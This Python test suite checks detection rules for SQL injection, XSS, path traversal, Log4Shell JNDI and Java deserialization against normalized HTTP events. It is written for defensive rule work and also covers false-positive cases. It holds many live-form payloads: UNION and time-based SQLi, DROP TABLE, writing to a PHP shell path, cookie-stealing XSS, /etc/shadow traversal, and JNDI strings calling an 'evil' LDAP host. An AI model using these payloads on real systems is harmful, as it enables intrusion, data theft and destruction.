"""Web 攻击规则测试（v1.5）：SQL 注入 / XSS / 路径遍历。

这组规则的难点从来不是"能不能报出来"，而是**能不能不误报**。
所以测试按两侧写：

    真阳性侧：教科书 payload、URL 编码变形、大小写变形、注释绕过 —— 必须命中
    真阴性侧：正常业务请求里"长得像但根本不是"的东西 —— 必须零命中

第二侧尤其重要：一条天天刷屏的规则等于没有规则，而且会被安全团队第一个关掉。
这里特意放了几个"擦边球"样本（单独的 `union` 关键词、单个引号、单层 `../`、
带 HTML 的正常提交），用来守住判据的收窄边界。

每个 payload 都过一遍真实的 `normalize()`——不是直接喂原文。因为规则匹配的是
归一化后的视图，跳过这一步测出来的"命中"是假的。
"""
from pathlib import Path

import pytest

from collectors.pcap import normalize, parse_file
from engine.detector import _matches, load_rules_dir, run_rules
from models import HttpEvent
from tools.pcapgen import http_request, pcap_bytes, tcp_frame

RULES = Path(__file__).parent.parent / "rules"


@pytest.fixture(scope="module")
def rules():
    return load_rules_dir(RULES)


@pytest.fixture(scope="module")
def by_id(rules):
    return {r.id: r for r in rules}


def _req(uri="/x", body="", method="GET", headers=None):
    """构造一个 http_request 事件（走**生产**的 `_build_event`）。

    v2.0 改成调用生产函数而不是手工拼 HttpEvent：引擎多了一个判据视图
    `sql_view`，手工构造时忘了填，`field: sql_view` 的规则就会静默不命中——
    测试全绿、线上漏报，这是最坏的一种"测试通过"。所以让测试也走同一条
    事件构造路径，字段永远齐。
    """
    from collectors.pcap import _build_event
    h = {"host": "shop.internal"}
    h.update(headers or {})
    return _build_event(
        __import__("datetime").datetime(2026, 11, 4, 21, 0, 0),
        "203.0.113.9",
        51234,
        f"{method} {uri} HTTP/1.1".encode("utf-8"),
        h,
        body.encode("utf-8"),
    )


def _hits(event, rules):
    """单条请求的**签名命中**。

    `threshold > 1` 的窗口规则也有 `match`，但那只是 `run_rules()` 里的
    前置过滤器（先筛出「要被计数的事件」），`match` 为真不等于这条请求
    该告警——例如 http-login-brute-force 对任意一次 `/api/login` 都返回
    True，要凑够 60s 内 30 次才会产出一条窗口告警。把这类规则算进
    「单条请求零误报」的断言里，等于把过滤器误当成判据。
    """
    return [r.id for r in rules
            if r.threshold == 1
            and event.event_type in r.event_types
            and _matches(event, r.match)]


# --------------------------------------------------------------------------
# 真阳性：教科书 payload 与各种变形
# --------------------------------------------------------------------------
@pytest.mark.parametrize("uri", [
    "/item?id=1 UNION SELECT username,password FROM users",
    "/item?id=1%20union%20select%20null,null",          # URL 编码
    "/item?id=1 union all select 1,2,3",
    "/item?id=1 union/**/select 1,2",                   # 注释绕过关键字
])
def test_sqli_union_select_is_caught(by_id, uri):
    assert "http-sqli-union-select" in _hits(_req(uri), [by_id["http-sqli-union-select"]])


@pytest.mark.parametrize("uri", [
    "/login?user=admin' or '1'='1",
    "/login?user=admin%27%20or%20%271%27%3D%271",       # 全 URL 编码
    "/login?user=x' or 1=1--",
    "/login?user=x' or 1=1#",
])
def test_sqli_boolean_blind_is_caught(by_id, uri):
    assert "http-sqli-boolean-blind" in _hits(_req(uri), [by_id["http-sqli-boolean-blind"]])


@pytest.mark.parametrize("uri", [
    "/item?id=1 and sleep(5)",
    "/item?id=1;select sleep (5)",
    "/item?id=1 and benchmark(1000000,md5(1))",
    "/item?id=1;waitfor delay '0:0:5'",
])
def test_sqli_time_based_is_caught(by_id, uri):
    assert "http-sqli-time-based" in _hits(_req(uri), [by_id["http-sqli-time-based"]])


@pytest.mark.parametrize("uri", [
    "/item?id=1 union select table_name from information_schema.tables",
    "/item?id=1 and load_file('/etc/passwd')",
    "/item?id=1 into outfile '/var/www/shell.php'",
])
def test_sqli_metadata_probe_is_caught(by_id, uri):
    assert "http-sqli-metadata-probe" in _hits(
        _req(uri), [by_id["http-sqli-metadata-probe"]])


@pytest.mark.parametrize("uri,body", [
    ("/comment", "content=<script>alert(1)</script>"),
    ("/comment", "content=%3Cscript%3Ealert(1)%3C/script%3E"),   # 编码变形
    ("/comment", "content=<svg/onload=alert(1)>"),
    ("/comment", "content=<img src=x onerror=alert(1)>"),
    ("/redir?next=javascript:alert(document.cookie)", ""),
])
def test_xss_script_injection_is_caught(by_id, uri, body):
    assert "http-xss-script-injection" in _hits(
        _req(uri, body, "POST" if body else "GET"),
        [by_id["http-xss-script-injection"]])


@pytest.mark.parametrize("body", [
    "c=<img src=1 onerror=alert(1)>",
    "c=<body onload=alert('x')>",
    "c=<div onmouseover=alert(1)>x</div>",
])
def test_xss_event_handler_is_caught(by_id, body):
    assert "http-xss-event-handler" in _hits(
        _req("/comment", body, "POST"), [by_id["http-xss-event-handler"]])


@pytest.mark.parametrize("uri", [
    "/download?file=../../../../etc/passwd",
    "/download?file=..%2F..%2F..%2Fetc%2Fpasswd",        # 编码变形
    "/download?file=/etc/shadow",
    "/download?file=..\\..\\windows\\win.ini",
    "/download?file=/proc/self/environ",
])
def test_path_traversal_is_caught(by_id, uri):
    assert "http-path-traversal" in _hits(_req(uri), [by_id["http-path-traversal"]])


# --------------------------------------------------------------------------
# v2.0：判据从「枚举写法」变成「描述形状」
#
# 这一组样本的共同点是——**它们的写法各不相同，但语法是同一件事**。
# 子串判据只能一个个枚举，正则判据能一次覆盖整族；测试要守的就是"整族"，
# 所以每条规则都给多种分隔符/编码变体，而不是只给一个教科书 payload。
# --------------------------------------------------------------------------

@pytest.mark.parametrize("uri", [
    "/item?id=1 union select 1",              # 空格
    "/item?id=1 union%0Aselect 1",            # 换行
    "/item?id=1 union%09select 1",            # Tab
    "/item?id=1 union/**/all/**/select 1",    # 注释 + all
    "/item?id=1 /*!50000un*/ion select 1",    # MySQL 版本注释劈开关键字
    "/item?id=1 un/**/ion se/**/lect 1",      # 关键字内部插注释
])
def test_sqli_union_separator_variants_are_caught(by_id, uri):
    """`union` 与 `select` 之间可以是任何 SQL 空白/注释，判据要覆盖整族。"""
    assert "http-sqli-union-select" in _hits(_req(uri), [by_id["http-sqli-union-select"]])


@pytest.mark.parametrize("uri", [
    "/item?id=1234 OR 1=1",                        # 无引号恒真
    "/item?id=1' AND '1'='1' --",                  # 带引号（右引号常不闭合）
    '/item?id=-1839" or "1"="2',                   # 双引号
    "/item?id=1 and (1)=(1)",                       # 括号包裹
    "/item?id=EmptyValue' and 526=527",             # 恒假式盲注
    "/item?id=%u2019%20or%20%u2019a%u2019%3d%u2019a",   # IIS %uXXXX
])
def test_sqli_boolean_tautology_variants_are_caught(by_id, uri):
    assert "http-sqli-boolean-blind" in _hits(
        _req(uri), [by_id["http-sqli-boolean-blind"]])


@pytest.mark.parametrize("uri,body,rule", [
    ("/item?id=1; DROP TABLE users--", "", "http-sqli-stacked"),
    ("/item?id=1 AND extractvalue(1,concat(0x7e,user()))", "", "http-sqli-error-based"),
    ("/item?id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)", "", "http-sqli-error-based"),
])
def test_new_sqli_rules_are_caught(by_id, uri, body, rule):
    assert rule in _hits(_req(uri, body, "POST" if body else "GET"), [by_id[rule]])


@pytest.mark.parametrize("body", [
    "c=<details open ontoggle=alert(1)>",                       # 冷门事件名
    "c=<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",         # 非 alert 的执行函数
    "c=<body onpageshow=alert(1)>",
    "c=<img src=x &#111;nerror=alert(1)>",                       # 数字实体拆属性名
    "c=<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\" src=\"data:,alert(1)\"/>",
])
def test_xss_structural_variants_are_caught(by_id, body):
    """事件处理器与命名空间标签：判据是"结构"，不是"那几个字符串"。"""
    ids = _hits(_req("/comment", body, "POST"),
                [by_id["http-xss-event-handler"], by_id["http-xss-script-injection"]])
    assert ids, f"未命中: {body}"


@pytest.mark.parametrize("uri,rule", [
    ("/get?foo=.../.../WINDOWS/win.ini", "http-path-traversal-obfuscated"),
    ("/get?foo=0x2e.%000x2f0x2e.%00/WINDOWS/win.ini", "http-path-traversal-obfuscated"),
    ("/get?foo=0x5c0x2e.%00/", "http-path-traversal-obfuscated"),
    ("/download?f=..%c0%af..%c0%afetc%c0%afpasswd", "http-encoding-overlong-utf8"),
])
def test_encoding_bypass_variants_are_caught(by_id, uri, rule):
    assert rule in _hits(_req(uri), [by_id[rule]])


# ---------- 未声明 Content-Type 的 body（v2.5） ----------

@pytest.mark.parametrize("body,rule", [
    # 空格被 form 编码成 `+`，且**没有声明 Content-Type**。
    # 服务端（PHP/CGI）对未声明的 POST body 默认按 form 解析，所以这就是
    # `' WAITFOR DELAY '`。v2.4 之前视图里是 `waitfor+delay`，判据匹配不到。
    ("%27+WAITFOR+DELAY+%27%0A", "http-sqli-time-based"),
    ("%22%3Bwaitfor+delay+%27%0A", "http-sqli-time-based"),
    # 大小写混合 + `+`：`union select` 的两个组成部分都被 `+` 打断过
    ("%22+UnIon+seleCt%0A", "http-sqli-union-select"),
    ("pay=UnIoN+SeLeCt%0A", "http-sqli-union-select"),
    # 布尔/堆叠：同样靠 `+` 分隔
    ("pay%3DAND+2771%3D1709%29", "http-sqli-boolean-blind"),
    ("pay=%3B+insert+into", "http-sqli-stacked"),
    # 写文件
    ("into+outfile+%27%0A", "http-sqli-metadata-probe"),
])
def test_undeclared_content_type_body_is_read_as_form(by_id, body, rule):
    """v2.5：未声明 Content-Type 的 body 按 form 解释，这批载荷才认得出来。

    这 7 个形状全部来自 OWASP CRS 回归集（`942240` / `942210` / `942190`），
    在 v2.4 之前一条都命中不了——不是判据太窄，是**视图里那个空格没被还原**。
    改完 CRS 全量 335 → 359，真实流量主矩阵一个数没变（§2.15）。
    """
    assert rule in _hits(_req("/submit", body, "POST"), [by_id[rule]])


@pytest.mark.parametrize("ctype,body", [
    # 声明了 JSON/XML，`+` 就是字面量——无视声明去替换是另一种失真
    ("application/json", '{"q":"1+UnIon+SeLeCt+2"}'),
    ("application/xml", "<a p=\"'+waitfor+delay+'\"/>"),
    # multipart 里的 `+` 也在 base64 附件里，同样是字面量
    ("multipart/form-data; boundary=XX", "--XX\r\n'+waitfor+delay+'\r\n--XX--"),
])
def test_declared_non_form_body_keeps_literal_plus(by_id, ctype, body):
    """声明了非 form 类型时**不许**替换 `+`。

    这是 v2.5 放宽条件的边界：只放宽「未声明」，不放宽「声明了别的」。
    测试要守住的是「尊重 Content-Type 证据」这条线——一旦为了多抓样本
    变成无条件替换，`+` 在 JSON 数值/base64/multipart 里都会被误解。
    """
    from collectors.pcap import _build_event
    import datetime as _dt
    ev = _build_event(_dt.datetime(2026, 11, 15, 21, 0, 0), "203.0.113.9", 5000,
                      b"POST /api HTTP/1.1",
                      {"host": "x", "content-type": ctype}, body.encode())
    for rid in ("http-sqli-time-based", "http-sqli-union-select"):
        assert not _matches(ev, by_id[rid].match), f"{ctype} 不该被当 form 解：{rid}"


@pytest.mark.parametrize("ua", [
    "${jndi:ldap://evil/a}",
    "${${lower:j}ndi:ldap://evil/a}",        # 前缀被查找拆开
    "${${env:FOO:-j}ndi:ldap://evil/a}",
    "${jndi:${lower:l}dap://evil/a}",        # 连协议名都被拆开
])
def test_jndi_obfuscation_variants_are_caught(by_id, ua):
    """判据是 JNDI 协议串，不是 `${jndi:` 这四个字母。"""
    from collectors.pcap import _build_event
    import datetime as _dt
    ev = _build_event(_dt.datetime(2026, 11, 14, 21, 0, 0), "203.0.113.9", 5000,
                      b"GET / HTTP/1.1", {"host": "x", "user-agent": ua}, b"")
    assert "http-log4shell-jndi" in _hits(ev, [by_id["http-log4shell-jndi"]])


@pytest.mark.parametrize("body", [
    '{"@type":"java.net.Inet4Address","val":"evil"}',
    '{"@TYPE":"java.net.Inet4Address","val":"evil"}',          # 大小写变形
    '{"@type":"com.sun.rowset.JdbcRowSetImpl","x":"ldap://e/a"}',
    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",          # Java 序列化魔数
])
def test_deserialization_payloads_are_caught(by_id, body):
    ids = _hits(_req("/api/parse", body, "POST"),
                [by_id["http-fastjson-autotype"], by_id["http-java-serialized"]])
    assert ids, f"未命中: {body}"


# --------------------------------------------------------------------------
# 真阴性：长得像但不是 —— 一条都不许报
# --------------------------------------------------------------------------
BENIGN = [
    ("/api/orders?page=2&size=20", "", "GET"),
    ("/search?q=union", "", "GET"),                      # 只有 union 没有 select
    ("/article?id=1'", "", "GET"),                       # 单个引号
    ("/help?topic=what's new", "", "GET"),               # 撇号不是注入
    ("/admin/images/../icon.png", "", "GET"),            # 单层 ../ 正常回退
    ("/static/js/app.js?v=1.2.3", "", "GET"),
    ("/api/login", '{"user":"alice","pass":"x"}', "POST"),
    ("/api/comment", "content=这个页面加载很慢，sleep 了 5 秒", "POST"),  # 中文正文里的 sleep
    ("/api/comment", "content=请用 onerror 事件监听图片失败", "POST"),
    ("/health", "", "GET"),
    ("/item?id=1001", "", "GET"),
    ("/api/upload", "filename=report-2026.pdf", "POST"),
    # ---- v2.0 新增的"擦边球"：判据放宽之后，这些必须仍然不报 ----
    # 自然语言搜索参数：有 and/or 有等号，但不是布尔条件
    ("/search?q=red and size=xl", "", "GET"),
    ("/search?q=cats or dogs=yes", "", "GET"),
    # 单层的 0x2e（普通十六进制参数，没有配套的 0x2f/0x5c）
    ("/api/render?color=0x2e2e2e", "", "GET"),
    # base64 串中间恰好撞上 ro0ab —— 真实流量里出现过 8 次（广告平台 cookie）
    ("/p?token=0ro0abxcsaaanjwaaaaaaaaaaaaa", "", "GET"),
    # JSON-LD 的 @type 是短名，不是全限定类名
    ("/api/ld", '{"@type":"Person","name":"x"}', "POST"),
    # 事件处理器没有标签上下文：单独出现不是 XSS（也不会被执行）
    ("/api/comment", "content=请用 onerror 事件监听图片失败", "POST"),
    # 正常的 HTML 片段
    ("/api/comment", "content=<p>这是一段正文</p>", "POST"),
]


@pytest.mark.parametrize("uri,body,method", BENIGN)
def test_benign_requests_trigger_nothing(rules, uri, body, method):
    """正常请求全规则零命中。这是这组规则能不能活下来的底线。"""
    event = _req(uri, body, method)
    assert _hits(event, rules) == [], f"误报了: {uri} {body}"


def test_union_rule_known_false_positive_is_documented(by_id):
    """**已知识别边界**：搜索框里输入 `union select` 会被判成注入。

    这条测试断言的是"它确实会报"，不是"它不该报"。放在这里而不是从
    阴性用例里删掉，是因为删掉等于把问题藏起来：判据是子串/正则，
    它无法区分"用户在搜索 SQL 语法"与"攻击者在注入"——这个区别需要
    上下文（参数名、是否进了 WHERE 子句、错误回显），不是签名能给的。

    所以这条边界要**写在规则里、写在 BENCHMARK 里、也写在测试里**。
    三份实测（周一/周二/周四全量 15.0 万条良性请求）里这种情况是 0 次，
    但技术博客的站内搜索确实可能撞上，部署时应知道这个代价。
    """
    assert "http-sqli-union-select" in _hits(
        _req("/search?q=union select committee report"),
        [by_id["http-sqli-union-select"]])


def test_threshold_rule_match_is_a_filter_not_a_verdict(by_id):
    """守卫 v1.7 的语义：频次规则的 match 是计数器筛选器，不是单条告警。

    这条如果哪天失败，多半是有人把 `_hits()` 的 `threshold == 1` 过滤去掉了，
    于是「正常登录请求零误报」会被误判为回归，进而有人去删规则的 match——
    那会把频次规则变成「全天所有请求一起计数」，彻底失去针对性。
    """
    rule = by_id["http-login-brute-force"]
    assert rule.threshold > 1
    assert _matches(_req("/api/login"), rule.match) is True
    assert _hits(_req("/api/login"), [rule]) == []
    assert run_rules([_req("/api/login")], [rule]) == []


def test_benign_batch_through_run_rules(rules):
    """走完整引擎（含窗口聚合）也不该产出任何告警。"""
    events = [_req(u, b, m) for u, b, m in BENIGN]
    for i, e in enumerate(events):
        e.ts = e.ts.replace(second=i)
        e.ip = f"198.51.100.{i + 1}"          # 换 IP，避免阈值规则凑成一组
    alerts = run_rules(events, rules)
    assert alerts == [], f"正常请求产生了告警: {[(a.rule_id, a.title) for a in alerts]}"


# --------------------------------------------------------------------------
# 端到端：PCAP → 还原 → 命中（证明规则在真实链路上有效，不只是单测通过）
# --------------------------------------------------------------------------
def test_sqli_detected_through_pcap_pipeline(tmp_path, rules):
    """注入藏在 PCAP 里的 URI 中，走完 解析→归一化→匹配 全链路要能报出来。"""
    payload_uri = "/item?id=1%20union%20select%20username%20from%20users"
    records = [
        (1793797200.0, tcp_frame("198.51.100.7", "10.0.0.80", 41000, 80,
                                 1_000_000,
                                 http_request("GET", payload_uri, "shop.internal"))),
        # 对照：一条正常请求，不该报
        (1793797200.5, tcp_frame("198.51.100.7", "10.0.0.80", 41001, 80,
                                 2_000_000,
                                 http_request("GET", "/api/orders?page=2",
                                              "shop.internal"))),
    ]
    pcap = tmp_path / "sqli.pcap"
    pcap.write_bytes(pcap_bytes(records))

    alerts = run_rules(parse_file(pcap), rules)
    ids = [a.rule_id for a in alerts]
    assert "http-sqli-union-select" in ids
    assert len(alerts) == 1, f"正常请求不该告警: {ids}"


def test_new_rules_are_exportable_to_sigma(by_id):
    """Web 攻击这一组都应可导出为 Sigma（阈值规则才不可导出）。

    v2.0 增加了 error-based / stacked / traversal-obfuscated 三条，
    并且给前两条 SQLi 换成了正则判据——正则必须能导出成 `|re`，
    否则它们会从 `sigma/` 里静默消失。
    """
    new_ids = [rid for rid in by_id if rid.startswith(("http-sqli", "http-xss"))
               or rid.startswith("http-path-traversal")]
    assert len(new_ids) == 10, sorted(new_ids)
    from tools.to_sigma import to_sigma
    for rid in new_ids:
        data = to_sigma(by_id[rid])
        assert data["detection"]["condition"]
        assert data["level"] in {"low", "medium", "high", "critical"}
